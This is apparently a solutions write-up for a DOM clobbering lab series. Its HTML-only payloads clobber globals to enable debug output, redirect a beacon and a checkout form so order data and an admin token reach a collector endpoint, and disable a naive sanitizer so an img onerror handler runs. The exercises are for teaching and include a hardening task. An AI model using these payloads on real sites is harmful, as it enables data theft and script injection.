# Solutions

Spoilers. Try each lab first — every payload below is HTML-only (no `<script>`).

---

## Lab 1 — Debug mode by default

The victim compares a global against a string:

```js
const env = window.APP_ENV || 'production';
if (env !== 'production') { /* debug */ }
```

A named element makes `window.APP_ENV` an `HTMLAnchorElement`, which is truthy and
`!== 'production'`.

```html
<a id="APP_ENV"></a>
```

Result: debug branch runs, secret is printed, flag awarded.

---

## Lab 2 — Analytics beacon

Need `window.analyticsConfig.beacon` to be attacker-controlled.

1. Two elements with the same `id` make `window.analyticsConfig` an `HTMLCollection`.
2. Named access (`.beacon`) reaches a child with `name="beacon"`.
3. String concatenation coerces the element; `HTMLAnchorElement.toString()` returns `href`.

```html
<a id="analyticsConfig"></a>
<a id="analyticsConfig" name="beacon" href="/collect"></a>
```

The beacon URL becomes `http://127.0.0.1:8000/collect?sid=sid_…`, which the collector logs.
This is the classic "element as string" gadget.

---

## Lab 3 — Checkout hijack

`document.checkoutForm` is a named property lookup. Supply a form and control its `action`:

```html
<form name="checkoutForm" action="/collect"></form>
```

`form.action` resolves to the absolute URL `http://127.0.0.1:8000/collect`, so the order JSON
(email, order ref, totals) is POSTed to the attacker collector.

Why it works: `document.<name>` resolves to the element; the fallback object is never reached.

Real-world note: in this lab the collector is same-origin, so the JSON `fetch` completes. A true
cross-origin JSON POST would hit a CORS preflight; that's why real attacks often aim the hijack
at a form submission, a `no-cors` beacon, or a same-site endpoint instead.

---

## Lab 4 — Stored clobber disables the sanitizer

Two steps, because the clobber has to survive sanitization and be present before the config is
read.

**Step 1 — bio (persisted, sanitized):**

```html
<a id="securityConfig"></a>
```

The naive sanitizer only removes `<script>` and `on*` handlers, so the anchor survives. On the
next render the bio is inserted into the DOM first.

**Step 2 — comment (rendered raw once config is clobbered):**

```html
<img src=x onerror="window.__pwned = true">
```

Now `window.securityConfig` is an anchor, `SECURITY.strict` is `undefined` (falsy), and the
comment goes straight into `innerHTML`. The broken image fires `onerror` → `window.__pwned` is
`true` → verify passes.

Notes:
- If the bio did not persist, the config would be read from the real object and the comment
  would be escaped.
- This is `stored` clobbering: the injected tag lives in persisted data, not the current payload.

---

## Lab 5 — Capstone: unsigned upload

Two independent globals must be clobbered.

**Guard** — `guard.verify` must be falsy:

```html
<a id="uploadGuard"></a>
```

`window.uploadGuard.verify` is `undefined` → the `else` branch is taken → `signed: false`.

**Destination** — `dest.url` must be a string pointing at the collector. Use the collection
gadget from Lab 2:

```html
<a id="uploadDest"></a>
<a id="uploadDest" name="url" href="/collect"></a>
```

`fetch()` converts its input to a `USVString`; `HTMLAnchorElement.toString()` yields the
absolute `href`, so the POST goes to `/collect`.

Full payload:

```html
<a id="uploadGuard"></a>
<a id="uploadDest"></a>
<a id="uploadDest" name="url" href="/collect"></a>
```

The collector receives JSON containing `"signed": false` and the admin token → flag.

Why one clobber isn't enough:
- Guard only → unsigned, but still POSTs to `/api/upload`.
- Destination only → reaches `/collect`, but the body is signed.

---

## Bonus exercises

- **Single element, missing property:** confirm that `<a id="cfg">` makes every `cfg.x` that
  isn't a real anchor property `undefined`. Try it on Lab 5's guard.
- **`form` named controls:** build `<form id="c"><input name="flag" value="1"></form>` and check
  `c.flag` / `c.flag.value`.
- **Collection length:** add a third `<a id="analyticsConfig">` in Lab 2 and log
  `window.analyticsConfig.length`.
- **`document.forms`/`document.links`:** see how those collections interact with injected
  elements.
- **Harden it:** rewrite Lab 1's victim to use `Object.hasOwn(window, 'APP_ENV')` plus a
  `typeof` check, and confirm the payload stops working.
